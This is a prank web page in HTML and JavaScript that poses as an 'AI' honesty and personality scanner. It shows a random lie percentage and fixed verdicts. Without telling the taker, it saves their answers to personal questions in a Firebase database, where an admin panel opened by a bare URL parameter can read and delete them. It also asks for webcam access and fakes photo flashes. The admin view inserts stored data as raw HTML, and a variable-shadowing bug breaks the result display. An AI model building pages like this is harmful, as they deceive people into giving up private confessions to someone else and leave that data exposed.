<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Neural Truth Scanner</title>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

<style>
*{box-sizing:border-box}
body{
  margin:0;
  font-family:system-ui,Segoe UI,Arial;
  background:#05060a;
  color:#e8faff;
}
.hidden{display:none}

:root{
  --neon:#00f7ff;
  --pink:#ff3cac;
  --bg:#0a0f1f;
}

/* ===== COMMON ===== */
.btn{
  padding:16px 30px;
  border-radius:40px;
  border:none;
  background:linear-gradient(135deg,var(--neon),var(--pink));
  color:black;
  font-size:18px;
  cursor:pointer;
  font-weight:700;
  transition:.3s;
}
.btn:hover{transform:scale(1.08)}

.glass{
  background:rgba(255,255,255,.06);
  backdrop-filter:blur(12px);
  border:1px solid rgba(255,255,255,.15);
  border-radius:20px;
  padding:20px;
  box-shadow:0 0 30px rgba(0,247,255,.15);
}

/* ===== START ===== */
#start{
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  text-align:center;
}
#start h1{
  font-size:2.4em;
  color:var(--neon);
  text-shadow:0 0 20px var(--neon);
}

/* ===== QUESTIONS ===== */
#quiz{
  max-width:700px;
  margin:auto;
  padding:20px;
}
.option{
  width:100%;
  margin:12px 0;
  padding:18px;
  border-radius:50px;
  background:rgba(0,247,255,.08);
  color:white;
  border:1px solid rgba(0,247,255,.3);
  font-size:18px;
  cursor:pointer;
  transition:.25s;
}
.option:hover{
  background:rgba(255,60,172,.25);
  transform:scale(1.04);
}
.progress{
  height:10px;
  background:#111;
  border-radius:10px;
  overflow:hidden;
  margin-top:20px;
}
.progress div{
  height:100%;
  width:0%;
  background:linear-gradient(90deg,var(--neon),var(--pink));
  transition:1s;
}

/* ===== LOADER ===== */
#loader{
  text-align:center;
  padding:40px;
}
.spinner{
  width:70px;
  height:70px;
  border:6px solid #222;
  border-top:6px solid var(--neon);
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin:30px auto;
}
@keyframes spin{100%{transform:rotate(360deg)}}

/* ===== RESULT ===== */
#result h2{
  color:var(--pink);
  text-shadow:0 0 15px var(--pink);
}

/* ===== CAMERA ===== */
#camera video{
  width:100%;
  border-radius:20px;
  border:2px solid var(--neon);
}
.flash{
  position:fixed;
  inset:0;
  background:white;
  opacity:.9;
  z-index:999;
  display:none;
}

/* ===== ADMIN ===== */
#admin{
  display:flex;
  height:100vh;
}
#left{
  width:35%;
  border-right:1px solid #222;
  overflow:auto;
}
#right{
  flex:1;
  padding:20px;
}
.card{
  padding:15px;
  border-bottom:1px solid #222;
  cursor:pointer;
  transition:.3s;
}
.card:hover{background:#0e1630}
.card.active{
  background:linear-gradient(90deg,#0e1630,#05060a);
  box-shadow:inset 4px 0 var(--neon);
}
.badge{
  font-size:12px;
  color:var(--neon);
}

/* delete */
.danger{
  background:linear-gradient(135deg,#ff0844,#ffb199);
  color:black;
  padding:12px 20px;
  border:none;
  border-radius:30px;
  font-weight:700;
  cursor:pointer;
}
</style>
</head>
<body>

<!-- START -->
<div id="start">
  <div class="glass">
    <h1>Neural Truth Scanner üß†</h1>
    <p>AI-based personality & honesty detection</p>
    <button class="btn" onclick="init()">Start Scan</button>
  </div>
</div>

<!-- QUIZ -->
<div id="quiz" class="hidden glass">
  <h2 id="qNo"></h2>
  <p id="qText"></p>
  <div id="options"></div>
  <div class="progress"><div id="prog"></div></div>
</div>

<!-- LOADER -->
<div id="loader" class="hidden glass">
  <div class="spinner"></div>
  <p id="loadText">Initializing neural scan‚Ä¶</p>
</div>

<!-- RESULT -->
<div id="result" class="hidden glass">
  <h2>Scan Complete</h2>
  <p id="lie"></p>
  <p id="per"></p>
  <p id="vibe"></p>
  <button class="btn" onclick="cameraPrank()">Analyze Facial Expressions üòè</button>
</div>

<!-- CAMERA -->
<div id="camera" class="hidden glass">
  <video id="video" autoplay playsinline></video>
  <p id="camMsg"></p>
  <button class="btn hidden" id="closeCam" onclick="endCamera()">Close</button>
</div>

<div class="flash" id="flash"></div>

<!-- ADMIN -->
<div id="admin" class="hidden">
  <div id="left"></div>
  <div id="right">
    <h2>Response Viewer</h2>
    <div id="details">Select a response</div>
  </div>
</div>

<script>
/* ===== FIREBASE ===== */
firebase.initializeApp({
  apiKey:"AIzaSyAuLOmBQ3xKNcYN2rzOo-3gY3-2UqIIyWk",
  authDomain:"prankgame-6ad46.firebaseapp.com",
  projectId:"prankgame-6ad46"
});
const db=firebase.firestore();

/* ===== DATA ===== */
const Q=[
"Have you ever smiled at your phone and locked it fast?",
"Do you overthink conversations at night?",
"Have you said 'I'm fine' when you were not?",
"Do you replay moments that already passed?",
"Have you hidden feelings when asked directly?",
"Have you felt insecure around a friend?",
"Does your brain wake up at 2AM?",
"Do people know the real you?",
"Have you pretended not to care?",
"Have you found someone better than admin? üòÖ"
];

let i=0,answers=[];

/* ===== INIT ===== */
const params=new URLSearchParams(location.search);
const play=params.get("play");
const admin=params.get("admin");

function init(){
  if(admin){showAdmin();return;}
  if(!play){alert("Invalid or expired link");return;}
  document.getElementById("start").classList.add("hidden");
  document.getElementById("quiz").classList.remove("hidden");
  showQ();
}

/* ===== QUIZ ===== */
function showQ(){
  if(i>=Q.length){submit();return;}
  qNo.innerText=`Question ${i+1}/${Q.length}`;
  qText.innerText=Q[i];
  options.innerHTML="";
  ["YES","NO","MAYBE"].forEach(o=>{
    let b=document.createElement("button");
    b.className="option";
    b.innerText=o;
    b.onclick=()=>{answers.push({q:Q[i],a:o});i++;prog.style.width=(i/Q.length*100)+"%";showQ();}
    options.appendChild(b);
  });
}

/* ===== SUBMIT ===== */
function submit(){
  quiz.classList.add("hidden");
  loader.classList.remove("hidden");
  const steps=["Analyzing honesty‚Ä¶","Scanning personality‚Ä¶","Detecting lies‚Ä¶","Finalizing report‚Ä¶"];
  let s=0;
  const int=setInterval(()=>{
    loadText.innerText=steps[s++]||"Done";
    if(s>steps.length){clearInterval(int);finish();}
  },1200);
}

function finish(){
  loader.classList.add("hidden");
  result.classList.remove("hidden");
  const lie=Math.floor(Math.random()*20)+76;
  lie.innerText=`Lie Probability: ${lie}%`;
  per.innerText="Personality: Overthinking Strategist üß†";
  vibe.innerText="Vibe: Calm outside, chaos inside üòå";

  db.collection("links").doc(play).update({
    status:"used",
    answers,
    lie,
    time:Date.now()
  });
}

/* ===== CAMERA PRANK ===== */
function cameraPrank(){
  result.classList.add("hidden");
  camera.classList.remove("hidden");
  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
  .then(s=>{video.srcObject=s;flashLoop(0);});
}

function flashLoop(n){
  if(n>=3){
    camMsg.innerText="Relax üòå No photo was taken. Just a prank üòÇ";
    closeCam.classList.remove("hidden");
    return;
  }
  flash.style.display="block";
  new Audio("https://www.soundjay.com/camera/camera-shutter-click-03.mp3").play();
  setTimeout(()=>flash.style.display="none",200);
  setTimeout(()=>flashLoop(n+1),700);
}

function endCamera(){
  camera.classList.add("hidden");
  result.classList.remove("hidden");
}

/* ===== ADMIN ===== */
function showAdmin(){
  start.classList.add("hidden");
  admin.classList.remove("hidden");

  db.collection("links").orderBy("time","desc").onSnapshot(snap=>{
    left.innerHTML="";
    snap.forEach(doc=>{
      const d=doc.data();
      const c=document.createElement("div");
      c.className="card";
      c.innerHTML=`<b>${d.nickname||"Unnamed"}</b><br><span class="badge">${d.status}</span>`;
      c.onclick=()=>select(doc.id,d,c);
      left.appendChild(c);
    });
  });
}

function select(id,data,card){
  document.querySelectorAll(".card").forEach(c=>c.classList.remove("active"));
  card.classList.add("active");

  details.innerHTML=`
    <p><b>Lie %:</b> ${data.lie||"-"}</p>
    <p><b>Answers:</b><br>${(data.answers||[]).map(a=>a.q+" ‚Üí "+a.a).join("<br>")}</p>
    <button class="danger" onclick="deleteEntry('${id}')">Delete Response</button>
  `;
}

function deleteEntry(id){
  if(!confirm("Delete permanently?"))return;
  db.collection("links").doc(id).delete().then(()=>{
    details.innerHTML="Deleted ‚úîÔ∏è";
  });
}
</script>
</body>
</html>
